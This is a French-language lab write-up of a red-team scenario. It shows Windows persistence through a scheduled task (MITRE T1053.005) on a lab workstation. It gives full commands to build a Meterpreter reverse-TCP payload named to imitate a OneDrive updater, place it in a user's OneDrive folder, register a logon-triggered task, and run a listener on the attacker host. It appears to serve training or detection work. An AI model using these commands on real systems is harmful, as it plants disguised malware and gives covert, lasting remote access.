## Attaque

### Contexte

Après avoir obtenu une session SYSTEM au scénario 03, l'attaquant dépose un second
payload et crée une tâche planifiée qui le relance automatiquement à chaque connexion
d'alice. Si la session est perdue (redémarrage, détection), l'accès est rétabli sans
intervention de l'attaquant.

### Technique MITRE

| ID | Technique | Tactique |
|----|-----------|----------|
| T1053.005 | Scheduled Task | Persistence |

### Prérequis

| Élément | Valeur |
|---------|--------|
| Accès | Session Meterpreter SYSTEM |
| Cible | WS01 -> 192.168.10.101 |

### Exécution

#### 1. Générer le payload persistance (Kali)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4445 -f exe -o /tmp/OneDriveUpdater.exe
```

#### 2. Déposer le payload sur WS01

Depuis la session Meterpreter :

```bash
upload /tmp/OneDriveUpdater.exe C:\\Users\\alice.LAB\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveUpdater.exe
```

Le payload est déposé dans le dossier OneDrive existant pour imiter un fichier légitime.

#### 3. Créer la tâche planifiée

Depuis le shell SYSTEM (obtenu via getsystem au scénario 03) :
```bash
shell
```

```cmd
schtasks /create /tn "OneDriveUpdate" /tr "C:\Users\alice.LAB\AppData\Local\Microsoft\OneDrive\OneDriveUpdater.exe" /sc onlogon /ru LAB\alice /f
```

| Option                 | Signification                                   |
| ---------------------- | ----------------------------------------------- |
| `/tn "OneDriveUpdate"` | Nom imitant une tâche OneDrive légitime         |
| `/tr`                  | Chemin du payload à exécuter                    |
| `/sc onlogon`          | Déclenchement à chaque connexion d'alice        |
| `/ru LAB\alice`        | Exécution sous le compte alice (session Medium) |
| `/f`                   | Force la création sans confirmation             |

> La tâche tourne en Medium, pas en SYSTEM. La persistance maintient le foothold,
> pas le niveau de privilège (plus discret). Pour retrouver SYSTEM il faut repasser par le scénario 03.

#### 4. Préparer le listener (Kali)

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4445
run
```

### Résultat

Après redémarrage de WS01 :

![[persistence_session.png]]

Session Meterpreter ouverte automatiquement sur le port 4445 au login d'alice.